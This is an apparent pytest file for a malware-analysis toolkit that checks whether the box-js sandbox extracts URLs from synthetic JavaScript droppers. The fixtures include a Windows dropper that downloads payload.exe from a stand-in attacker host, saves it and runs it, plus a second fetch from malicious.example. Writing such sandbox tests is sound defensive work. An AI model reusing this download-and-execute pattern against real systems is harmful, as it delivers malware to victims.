"""Box-js dynamic analysis — exercises Utils/js_tools wrappers against
synthesised malicious-looking JS to confirm the chain works end-to-end.

These tests are gated on @pytest.mark.docker because box-js detonates
JavaScript inside its own VM sandbox; running it on the host detonates
attacker-controlled bytes against your host node interpreter. Only safe
inside the MATT Docker container (which has box-js, network isolation,
and a non-privileged user).

Run via ``make test-dynamic`` or
    docker run --rm -e MATT_IN_DOCKER=1 tabledevil/matt \\
        python -m pytest tests/ -m docker -v
"""

import os
import shutil
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from structure import Structure
from Utils.password_broker import PasswordBroker
from Utils import js_tools


_IN_DOCKER = os.environ.get("MATT_IN_DOCKER") == "1"
_BOX_JS = shutil.which("box-js")
pytestmark = [
    pytest.mark.docker,
    pytest.mark.skipif(not _IN_DOCKER, reason="not running inside MATT Docker"),
    pytest.mark.skipif(_BOX_JS is None, reason="box-js binary not on PATH"),
]


@pytest.fixture(autouse=True)
def _clear():
    Structure.clear_cache()
    PasswordBroker.clear()
    yield
    Structure.clear_cache()
    PasswordBroker.clear()


# ---------------------------------------------------------------
# Direct wrapper-level tests (no Structure pipeline)
# ---------------------------------------------------------------


def test_boxjs_available():
    assert js_tools.boxjs_available()


def test_run_boxjs_decodes_simple_url_dropper():
    """Classic JS dropper shape: WScript.Shell + MSXML2.XMLHTTP that
    fetches a URL. box-js emulates the runtime and yields the URL."""
    js = b"""
    var x = new ActiveXObject("MSXML2.XMLHTTP");
    x.open("GET", "http://attacker.example/payload.exe", false);
    x.send();
    var s = new ActiveXObject("ADODB.Stream");
    s.write(x.responseBody);
    s.saveToFile("payload.exe", 2);
    new ActiveXObject("WScript.Shell").Run("payload.exe");
    """
    result = js_tools.run_boxjs(js, timeout=20)
    assert result is not None, "box-js produced no output"
    urls = result.get("urls") or result.get("active_urls") or []
    assert any("attacker.example" in u for u in urls), urls


# ---------------------------------------------------------------
# End-to-end via ScriptAnalyzer
# ---------------------------------------------------------------


def test_script_analyzer_dynamic_module_runs_in_container():
    """ScriptAnalyzer's `dynamic_analysis` module should fire inside the
    container and produce a report when box-js extracts URLs/IOCs."""
    js = (
        b'var u = "http://malicious.example/" + "stage2.bin";\n'
        b'var x = new ActiveXObject("MSXML2.XMLHTTP");\n'
        b'x.open("GET", u, false); x.send();\n'
    )
    s = Structure.create(data=js, filename="dropper.js",
                         mime_type="application/javascript")
    # `dynamic_analysis` is one of ScriptAnalyzer's modules; it produces
    # a report keyed `dynamic_*` when box-js returns findings.
    dyn_keys = [k for k in s.analyzer.reports
                if "dynamic" in k.lower() or "boxjs" in k.lower()]
    assert dyn_keys, list(s.analyzer.reports)
